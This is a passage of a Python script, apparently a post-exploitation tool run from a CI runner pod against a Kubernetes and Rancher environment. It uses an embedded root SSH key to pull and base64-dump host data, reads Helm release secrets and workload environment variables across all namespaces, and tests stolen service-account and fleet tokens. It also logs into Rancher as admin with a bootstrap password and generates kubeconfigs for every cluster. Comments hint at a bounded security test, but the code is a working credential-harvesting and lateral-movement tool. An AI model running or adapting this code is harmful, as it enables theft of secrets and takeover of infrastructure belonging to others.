sz=$(stat -c%s "$OUT/host.tgz" 2>/dev/null || echo 0)
if [ "$sz" -gt 1200000 ]; then
  tar czf "$OUT/host.tgz" -C "$OUT" manifest.txt cmds.txt 2>/dev/null
fi
sz=$(stat -c%s "$OUT/host.tgz" 2>/dev/null || echo 0)
echo "===I10579HOST_BEGIN $sz==="
base64 -w 0 "$OUT/host.tgz"
echo
echo "===I10579HOST_END==="
rm -rf "$OUT"
'''

def host_harvest(tmp):
    out = {"attempted": False}
    ssh = shutil.which("ssh")
    if not ssh:
        out["error"] = "no ssh client"
        emit_json("HOST_META", out, 20000)
        return
    try:
        kp = write_file(os.path.join(tmp, "root_id_rsa"), ROOTKEY_B64, 0o600)
        out["attempted"] = True
        t0 = time.time()
        r = subprocess.run([ssh, "-i", kp, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                            "-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-o", "IdentitiesOnly=yes",
                            "-o", "LogLevel=ERROR", "root@10.17.1.1", "bash -s"],
                           input=HOST_SCRIPT, capture_output=True, timeout=240, text=True)
        out.update({"rc": r.returncode, "elapsed": round(time.time() - t0, 2), "stderr": r.stderr[-3000:]})
        so = r.stdout
        m = re.search(r"===I10579HOST_BEGIN (\d+)===\s*(\S+)\s*===I10579HOST_END===", so, re.S)
        if not m:
            out["error"] = "no host block"
            out["stdout_head"] = so[:4000]
            emit_json("HOST_META", out, 30000)
            return
        out["tar_size"] = int(m.group(1))
        out["tar_b64_len"] = len(m.group(2))
        emit_json("HOST_META", out, 30000)
        try:
            raw = base64.b64decode(m.group(2))
        except Exception as e:
            emit_json("HOST_META2", {"b64_error": str(e)}, 10000)
            return
        b64chunks("HOST_TAR", raw, 1150000)
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
        emit_json("HOST_META", out, 30000)

HELM = [
    ("arc-systems", "sh.helm.release.v1.arc.v1"),
    ("cattle-fleet-local-system", "sh.helm.release.v1.fleet-agent-local.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet-crd.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v1"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v2"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v3"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v4"),
    ("cattle-fleet-system", "sh.helm.release.v1.fleet.v5"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v1"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v2"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v3"),
    ("cattle-provisioning-capi-system", "sh.helm.release.v1.rancher-provisioning-capi.v4"),
    ("cattle-system", "sh.helm.release.v1.rancher-webhook.v1"),
    ("cattle-system", "sh.helm.release.v1.rancher-webhook.v2"),
]

def decode_release(j):
    data = (j.get("data") or {}).get("release")
    if not data:
        return {"error": "no release key", "keys": sorted((j.get("data") or {}).keys())}
    raw = base64.b64decode(data)
    raw2 = raw
    try:
        raw2 = gzip.decompress(raw)
    except Exception:
        pass
    try:
        jj = json.loads(raw2)
    except Exception as e:
        return {"decode_error": str(e), "raw_head": raw2[:400].decode("utf-8", "replace"), "raw_len": len(raw)}
    ch = jj.get("chart") or {}
    return {
        "name": jj.get("name"), "version": jj.get("version"), "namespace": jj.get("namespace"),
        "info": jj.get("info"),
        "chart_metadata": ch.get("metadata"),
        "chart_values": ch.get("values"),
        "config": jj.get("config"),
        "manifest_head": (jj.get("manifest") or "")[:4000],
        "hooks": [{"name": h.get("name"), "kind": h.get("kind"), "path": h.get("path")} for h in (jj.get("hooks") or [])],
    }

def kube_harvest(tmp):
    ca = write_file(os.path.join(tmp, "ca.crt"), CA_B64)
    crt = write_file(os.path.join(tmp, "client.crt"), CRT_B64)
    key = write_file(os.path.join(tmp, "client.key"), KEY_B64)
    k = Kube(ca, crt, key)
    meta = {"host": socket.gethostname(), "uid": os.getuid(), "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    ok, dt, err = tcp_open(API_HOST, API_PORT, 6)
    meta["tcp_6443"] = {"open": ok, "elapsed": dt, "error": err}
    try:
        st, body, _ = k.req("GET", "/version")
        meta["version"] = {"status": st, "body": body[:800].decode("utf-8", "replace")}
    except Exception as e:
        meta["version"] = {"error": "%s: %s" % (type(e).__name__, e)}
    emit_json("K8S_META", meta, 20000)
    if not ok or st != 200:
        return

    # 1) the 14 helm release secrets, decoded
    rels = []
    for ns, name in HELM:
        try:
            st, body, _ = k.req("GET", "/api/v1/namespaces/%s/secrets/%s" % (ns, name), timeout=60)
            if st != 200:
                rels.append({"ns": ns, "name": name, "status": st, "err": body[:300].decode("utf-8", "replace")})
                continue
            j = json.loads(body)
            d = decode_release(j)
            d["_ns"] = ns; d["_name"] = name; d["_status"] = st
            rels.append(d)
        except Exception as e:
            rels.append({"ns": ns, "name": name, "error": "%s: %s" % (type(e).__name__, e)})
        time.sleep(0.05)
    emit_json("HELM", {"count": len(rels), "items": rels}, 700000)

    # 2) workload env/args across all namespaces
    work = []
    paths = [("/api/v1/pods", "Pod"), ("/apis/apps/v1/deployments", "Deployment"),
             ("/apis/apps/v1/daemonsets", "DaemonSet"), ("/apis/apps/v1/statefulsets", "StatefulSet")]
    errs = []
    for path, kind in paths:
        try:
            st, body, _ = k.req("GET", path + "?limit=500", timeout=90)
            if st != 200:
                errs.append({"path": path, "status": st, "body": body[:300].decode("utf-8", "replace")})
                continue
            doc = json.loads(body)
            for it in doc.get("items", []):
                md = it.get("metadata", {}) or {}
                spec = it.get("spec", {}) or {}
                if kind == "Pod":
                    pspec = spec
                else:
                    pspec = (spec.get("template") or {}).get("spec", {}) or {}
                def cspec(c):
                    return {"n": c.get("name"), "img": c.get("image"), "cmd": c.get("command"),
                            "args": c.get("args"), "env": c.get("env"), "envFrom": c.get("envFrom")}
                work.append({"k": kind, "ns": md.get("namespace"), "name": md.get("name"),
                             "sa": pspec.get("serviceAccountName"),
                             "hostNet": pspec.get("hostNetwork"), "hostPID": pspec.get("hostPID"),
                             "containers": [cspec(c) for c in (pspec.get("containers") or [])],
                             "init": [cspec(c) for c in (pspec.get("initContainers") or [])],
                             "vols": [{"n": v.get("name"), "t": [kk for kk in v.keys() if kk != "name"]}
                                      for v in (pspec.get("volumes") or [])]})
        except Exception as e:
            errs.append({"path": path, "error": "%s: %s" % (type(e).__name__, e)})
    emit_json("WORKLOADS", {"count": len(work), "errors": errs, "items": work}, 900000)

    # 3) one SSAR per recovered SA/fleet token
    ssar = []
    ctok = SA_TOKENS.get("tokens") if isinstance(SA_TOKENS, dict) else None
    checks = []
    if isinstance(ctok, dict):
        for name, v in ctok.items():
            checks.append((name, (v or {}).get("token"), (v or {}).get("namespace")))
    checks.append(("fleet-local/local-kubeconfig", FLEET_TOKEN, "fleet-local"))
    for label, tok, ns in checks:
        if not tok:
            ssar.append({"token": label, "error": "no token"}); continue
        try:
            kk = Kube(ca, token=tok, host="10.96.0.1", port=443)
            body = {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectAccessReview",
                    "spec": {"resourceAttributes": {"verb": "list", "resource": "secrets"}}}
            st, rb, _ = kk.req("POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", body, timeout=30)
            rec = {"token": label, "status": st}
            try:
                jj = json.loads(rb)
                rec["allowed"] = (jj.get("status") or {}).get("allowed")
                rec["reason"] = (jj.get("status") or {}).get("reason")
                rec["evaluationError"] = (jj.get("status") or {}).get("evaluationError")
            except Exception:
                rec["body"] = rb[:300].decode("utf-8", "replace")
            ssar.append(rec)
        except Exception as e:
            ssar.append({"token": label, "error": "%s: %s" % (type(e).__name__, e)})
    emit_json("SSAR", {"count": len(ssar), "items": ssar}, 60000)

def rancher_phase(tmp):
    ca = write_file(os.path.join(tmp, "rancher-ca.crt"), RANCHER_CA_B64)
    out = {"attempts": []}
    base = None
    for host in ("https://10.106.75.65", "https://rancher.cattle-system.svc", "https://rancher.cattle-system.svc.cluster.local"):
        try:
            u = urllib.parse.urlparse(host)
            kk = Kube(ca, host=u.hostname, port=u.port or 443)
            st, body, _ = kk.req("GET", "/rancherversion", timeout=12)
            out["attempts"].append({"host": host, "status": st, "body": body[:300].decode("utf-8", "replace")})
            if st == 200:
                base = host
                break
        except Exception as e:
            out["attempts"].append({"host": host, "error": "%s: %s" % (type(e).__name__, e)})
    out["base"] = base
    emit_json("RANCHER_PROBE", out, 30000)
    if not base:
        return
    u = urllib.parse.urlparse(base)
    kk = Kube(ca, host=u.hostname, port=u.port or 443)

    # read-only enumerate with the fleet-local Rancher token
    try:
        kf = Kube(ca, host=u.hostname, port=u.port or 443, token=FLEET_TOKEN)
        st, body, _ = kf.req("GET", "/v3/clusters", timeout=30)
        emit_json("RANCHER_FLEET_CLUSTERS", {"status": st, "body": body[:200000].decode("utf-8", "replace")}, 220000)
    except Exception as e:
        emit_json("RANCHER_FLEET_CLUSTERS", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
    try:
        st, body, _ = kf.req("GET", "/k8s/clusters/local/version", timeout=20)
        emit_json("RANCHER_FLEET_LOCALVER", {"status": st, "body": body[:1000].decode("utf-8", "replace")}, 10000)
    except Exception as e:
        emit_json("RANCHER_FLEET_LOCALVER", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)

    # exactly one bounded bootstrap-password login
    login = {"password_len": len(RANCHER_PW)}
    try:
        st, body, _ = kk.req("POST", "/v3-public/localProviders/local?action=login",
                             {"username": "admin", "password": RANCHER_PW, "responseType": "json", "ttl": 60000},
                             timeout=30)
        login["status"] = st
        login["body"] = body[:1500].decode("utf-8", "replace")
        tok = None
        if st in (200, 201):
            try:
                tok = json.loads(body).get("token")
            except Exception:
                pass
        login["token_prefix"] = (tok or "")[:30]
    except Exception as e:
        login["error"] = "%s: %s" % (type(e).__name__, e)
        tok = None
    emit_json("RANCHER_LOGIN", login, 20000)
    if not tok:
        return
    kr = Kube(ca, host=u.hostname, port=u.port or 443, token=tok)
    try:
        st, body, _ = kr.req("GET", "/v3/clusters", timeout=30)
        doc = json.loads(body)
        cid = []
        for it in doc.get("data", []):
            cid.append({"id": it.get("id"), "name": it.get("name"), "state": it.get("state"),
                        "provider": it.get("provider"), "nodeCount": it.get("nodeCount"),
                        "version": (it.get("version") or {}).get("gitVersion") if isinstance(it.get("version"), dict) else it.get("version"),
                        "allocatable": it.get("allocatable")})
        emit_json("RANCHER_CLUSTERS", {"status": st, "count": len(cid), "clusters": cid}, 100000)
    except Exception as e:
        emit_json("RANCHER_CLUSTERS", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
        return
    for c in cid:
        cidv = c.get("id")
        try:
            st, body, _ = kr.req("POST", "/v3/clusters/%s?action=generateKubeconfig" % cidv, {}, timeout=40)
            rec = {"id": cidv, "status": st}
            try:
                rec["config"] = json.loads(body).get("config", "")[:20000]
            except Exception:
                rec["body"] = body[:1000].decode("utf-8", "replace")
            emit_json("RANCHER_KUBECONFIG_%s" % re.sub(r"[^A-Za-z0-9_.-]", "_", cidv or "x"), rec, 40000)
        except Exception as e:
            emit_json("RANCHER_KUBECONFIG_%s" % re.sub(r"[^A-Za-z0-9_.-]", "_", cidv or "x"),
                      {"id": cidv, "error": "%s: %s" % (type(e).__name__, e)}, 10000)

def pod_facts():
    info = {"env": {k: v for k, v in os.environ.items() if re.search(r"(KUBE|CI_|K8S|HCU|RUNNER|GITHUB_REPOSITORY)", k)},
            "has_public4": os.path.isdir("/public4/home"),
            "tools": {t: bool(shutil.which(t)) for t in ("ssh", "curl", "kubectl", "python3", "docker", "crictl")}}
    emit_json("POD_ENV", info, 60000)

def main():
    say("===I10579-BEGIN mode=%s ts=%s host=%s uid=%s===" % (MODE, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(), os.getuid()))
    tmp = tempfile.mkdtemp(prefix=".i10579-")
    os.chmod(tmp, 0o700)
    try:
        pod_facts()
        host_harvest(tmp)
        try:
            kube_harvest(tmp)
        except Exception as e:
            emit_json("K8S_FATAL", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
        try:
            rancher_phase(tmp)
        except Exception as e:
            emit_json("RANCHER_FATAL", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    say("===I10579-END ts=%s total_b64=%d===" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), TOTAL[0]))

if __name__ == "__main__":
    main()
